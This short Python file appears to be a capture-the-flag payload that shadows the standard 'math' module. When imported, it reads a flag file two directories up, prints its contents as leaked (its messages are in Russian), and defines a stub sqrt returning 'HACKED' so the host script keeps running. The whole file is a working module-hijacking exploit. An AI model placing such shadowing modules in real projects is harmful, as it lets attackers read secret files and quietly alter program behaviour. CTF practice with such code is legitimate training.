import os

print("\n[!] МОДУЛЬ MATH ПЕРЕХВАЧЕН!")
print("[!] Пытаюсь прочитать флаг...")

try:
    # Для локального теста читаем на 2 папки выше
    with open('../../flag.txt', 'r') as f:
        print("\nФЛАГ УСПЕШНО СЛИТ:", f.read())
except FileNotFoundError:
     print("\nФайл с флагом не найден.")

# Чтобы оригинальный скрипт не упал с ошибкой 'module has no attribute sqrt',
# добавим заглушку для функции, которую он ожидает:
def sqrt(x):
    return "HACKED"